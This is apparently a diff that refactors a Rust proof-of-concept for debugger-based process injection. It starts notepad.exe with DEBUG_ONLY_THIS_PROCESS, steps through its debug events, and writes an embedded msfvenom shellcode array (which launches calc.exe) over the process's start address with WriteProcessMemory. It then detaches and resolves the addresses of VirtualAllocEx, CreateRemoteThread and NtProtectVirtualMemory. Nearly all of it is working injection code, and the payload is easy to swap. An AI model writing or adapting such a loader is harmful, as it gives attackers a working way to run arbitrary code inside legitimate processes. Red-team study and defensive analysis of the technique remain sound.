@@ -1,18 +1,18 @@
-use std::{ffi::c_void, mem::size_of};
-use widestring::U16CString;
+use std::{
+    ffi::{c_void, OsStr},
+    iter::once,
+    mem::size_of,
+    os::windows::ffi::OsStrExt,
+};
 use windows::{
-    core::{s, PWSTR},
+    core::{s, Result, PWSTR},
     Win32::{
         Foundation::{DBG_CONTINUE, EXCEPTION_BREAKPOINT, HANDLE},
-        System::{
-            Diagnostics::Debug::*,
-            Threading::*,
-        },
+        System::{Diagnostics::Debug::*, Threading::*},
     },
 };
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -36,123 +36,134 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
 
-    let mut process_information = PROCESS_INFORMATION::default();
-    let mut debug_info = DEBUG_EVENT::default();
-    let mut startup_info = STARTUPINFOW::default();
-    startup_info.cb = size_of::<STARTUPINFOW>() as u32;
-    let path_name = U16CString::from_str("C:\\Windows\\System32\\notepad.exe")?;
+    let mut pi = PROCESS_INFORMATION::default();
+    let mut dbg = DEBUG_EVENT::default();
+    let si = STARTUPINFOW { cb: size_of::<STARTUPINFOW>() as u32, ..Default::default()};
+
+    // Create the command line as a wide string for the target process
+    let mut path = OsStr::new("C:\\Windows\\System32\\notepad.exe")
+        .encode_wide()
+        .chain(once(0))
+        .collect::<Vec<u16>>();
 
     unsafe {
+        // Create a process in debug mode
         CreateProcessW(
             None,
-            PWSTR(path_name.as_ptr() as _),
+            PWSTR(path.as_mut_ptr()),
             None,
             None,
             false,
             DEBUG_ONLY_THIS_PROCESS,
             None,
             None,
-            &startup_info,
-            &mut process_information,
-        ).map_err(|e| format!("[!] CreateProcessW Failed With Status: {e}"))?;
+            &si,
+            &mut pi,
+        )?;
 
-        for num in 0..7 {
-            if WaitForDebugEvent(&mut debug_info, 5000).is_ok() {
-                
-                match debug_info.dwDebugEventCode {
+        // Wait for a series of debug events (threads, DLLs, etc.)
+        for i in 0..7 {
+            if WaitForDebugEvent(&mut dbg, 5000).is_ok() {
+                match dbg.dwDebugEventCode {
+                    // Fired when the process starts
                     CREATE_PROCESS_DEBUG_EVENT => {
-                        println!("[+] Process PID: {}", debug_info.dwProcessId);
-                        println!("[+] Thread TID: {}", debug_info.dwThreadId);
-                        println!("[+] StartAddress: {:?}", debug_info.u.CreateProcessInfo.lpStartAddress);
-                        println!("[+] Process Main Thread: {:?}",debug_info.u.CreateProcessInfo.hThread);
-                    },
-                    
+                        println!("[+] Process PID: {}", dbg.dwProcessId);
+                        println!("[+] Thread TID: {}", dbg.dwThreadId);
+                        println!("[+] StartAddress: {:?}", dbg.u.CreateProcessInfo.lpStartAddress);
+                        println!("[+] Process Main Thread: {:?}", dbg.u.CreateProcessInfo.hThread);
+                    }
+
+                    // Fired when a new thread is created in the debugged process
                     CREATE_THREAD_DEBUG_EVENT => {
-                        println!("\n[+] Thread Created: {:?}", debug_info.u.CreateThread.lpStartAddress);
-                        println!("[+] Thread HANDLE: {:?}", debug_info.u.CreateThread.hThread);
-                        println!("[+] Thread ThreadLocalBase: {:?}", debug_info.u.CreateThread.lpThreadLocalBase);
-                    },
-                    
+                        println!("\n[+] Thread Created: {:?}", dbg.u.CreateThread.lpStartAddress);
+                        println!("[+] Thread HANDLE: {:?}", dbg.u.CreateThread.hThread);
+                        println!("[+] Thread ThreadLocalBase: {:?}", dbg.u.CreateThread.lpThreadLocalBase);
+                    }
+
+                    // Fired when a DLL is loaded into the target process
                     LOAD_DLL_DEBUG_EVENT => {
                         let mut buffer = [0u8; size_of::<usize>()];
                         let mut return_number = 0;
+
+                        // Read the DLL name pointer from the process memory
                         if ReadProcessMemory(
-                            process_information.hProcess, 
-                            debug_info.u.LoadDll.lpImageName, 
-                            buffer.as_mut_ptr() as _, 
-                            size_of::<usize>(), 
-                            Some(&mut return_number)
-                        ).is_ok() {
+                            pi.hProcess,
+                            dbg.u.LoadDll.lpImageName,
+                            buffer.as_mut_ptr().cast(),
+                            size_of::<usize>(),
+                            Some(&mut return_number),
+                        )
+                        .is_ok()
+                        {
+                            let addr = usize::from_ne_bytes(buffer) as *mut c_void;
+                            let mut name = vec![0u16; 260];
+                            println!("\n[+] DLL ADDRESS: {:?}", addr);
 
-                            let dll_address = usize::from_ne_bytes(buffer) as *mut c_void;
-                            let mut image_name = vec![0u16; 260];
-                            println!("\n[+] DLL ADDRESS: {:?}", dll_address);
-                            
+                            // Read the DLL name string itself
                             if ReadProcessMemory(
-                                process_information.hProcess, 
-                                dll_address, 
-                                image_name.as_mut_ptr() as _, 
-                                image_name.len(), 
-                                Some(&mut return_number)
-                            ).is_ok() {
-
-                                if let Some(first_null) = image_name.iter().position(|&c| c == 0) {
-                                    image_name.truncate(first_null);
+                                pi.hProcess,
+                                addr,
+                                name.as_mut_ptr().cast(),
+                                name.len(),
+                                Some(&mut return_number),
+                            )
+                            .is_ok()
+                            {
+                                if let Some(first_null) = name.iter().position(|&c| c == 0) {
+                                    name.truncate(first_null);
                                 }
 
-                                let dll_name = String::from_utf16_lossy(&image_name);
-                                println!("[+] DLL Name: {}", dll_name.trim_end_matches('\0'));
+                                println!("[+] DLL Name: {}", String::from_utf16_lossy(&name).trim_end_matches('\0'));
                             }
                         }
 
-                        println!("[+] DLL Base Address: {:?}", debug_info.u.LoadDll.lpBaseOfDll);
-                        println!("[+] DLL H_File: {:?}", debug_info.u.LoadDll.hFile);
-                    },
-                    
+                        println!("[+] DLL Base Address: {:?}", dbg.u.LoadDll.lpBaseOfDll);
+                        println!("[+] DLL H_File: {:?}", dbg.u.LoadDll.hFile);
+                    }
+
+                    // Fired when an exception occurs — we look for the initial breakpoint
                     EXCEPTION_DEBUG_EVENT => {
-                        if debug_info.u.Exception.ExceptionRecord.ExceptionCode== EXCEPTION_BREAKPOINT {
+                        if dbg.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT {
                             println!("[+] Breakpoint was successfully triggered");
                         }
-                    },
+                    }
                     _ => {}
                 }
 
-                if num == 6 {
+                if i == 6 {
+                    // Inject shellcode at the recorded start address
                     let mut number_of_write = 0;
                     WriteProcessMemory(
-                        process_information.hProcess,
-                        std::mem::transmute::<_, *mut c_void>(debug_info.u.CreateProcessInfo.lpStartAddress),
-                        shellcode.as_ptr() as _,
+                        pi.hProcess,
+                        std::mem::transmute(dbg.u.CreateProcessInfo.lpStartAddress),
+                        shellcode.as_ptr().cast(),
                         shellcode.len(),
                         Some(&mut number_of_write),
-                    ).map_err(|e| format!("[!] WriteProcessMemory Failed With Status: {e}"))?;
+                    )?;
 
-                    DebugActiveProcessStop(process_information.dwProcessId).map_err(|e| format!("[!] DebugActiveProcessStop Failed With Status: {e}"))?;
+                    // Stop debugging after injection
+                    DebugActiveProcessStop(pi.dwProcessId)?;
                 }
             }
 
-            if num < 6 {
-                ContinueDebugEvent(
-                    process_information.dwProcessId,
-                    process_information.dwThreadId,
-                    DBG_CONTINUE,
-                ).map_err(|e| format!("[!] ContinueDebugEvent Failed With Status: {e}"))?;
+            // Continue to the next debug event unless it's the final step
+            if i < 6 {
+                ContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, DBG_CONTINUE)?;
             }
         }
 
-        SymInitialize(HANDLE(0xffffffffffffffffu64 as _), None, true).expect("[!] SymInitialize Failed With Status");
-        
-        let mut symbol = SYMBOL_INFO::default();
-        symbol.SizeOfStruct = size_of::<SYMBOL_INFO>() as u32;
+        // Example of resolving symbol addresses dynamically
+        let mut symbol = SYMBOL_INFO { SizeOfStruct: size_of::<SYMBOL_INFO>() as u32, ..Default::default()};
+        SymInitialize(HANDLE(-1isize), None, true).expect("[!] SymInitialize Failed With Status");
 
-        SymFromName(HANDLE(0xffffffffffffffffu64 as _), s!("VirtualAllocEx"), &mut symbol).expect("[!] SymFromName Failed With Status ");
-        println!("\n[+] Example Address VirtualAllocEx: {:?}", symbol.Address as *mut c_void);
+        SymFromName(HANDLE(-1isize), s!("VirtualAllocEx"), &mut symbol).expect("[!] SymFromName Failed With Status ");
+        println!("\n[+] Example Address VirtualAllocEx: {:x?}", symbol.Address);
         
-        SymFromName(HANDLE(0xffffffffffffffffu64 as _), s!("CreateRemoteThread"), &mut symbol).expect("[!] SymFromName Failed With Status ");
-        println!("[+] Example Address CreateRemoteThread: {:?}", symbol.Address as *mut c_void);
+        SymFromName(HANDLE(-1isize), s!("CreateRemoteThread"), &mut symbol).expect("[!] SymFromName Failed With Status ");
+        println!("[+] Example Address CreateRemoteThread: {:x?}", symbol.Address);
 
-        SymFromName(HANDLE(0xffffffffffffffffu64 as _), s!("NtProtectVirtualMemory"), &mut symbol).expect("[!] SymFromName Failed With Status ");
-        println!("[+] Example Address NtProtectVirtualMemory: {:?}", symbol.Address as *mut c_void);
+        SymFromName(HANDLE(-1isize), s!("NtProtectVirtualMemory"), &mut symbol).expect("[!] SymFromName Failed With Status ");
+        println!("[+] Example Address NtProtectVirtualMemory: {:x?}", symbol.Address);
     };
 
     Ok(())
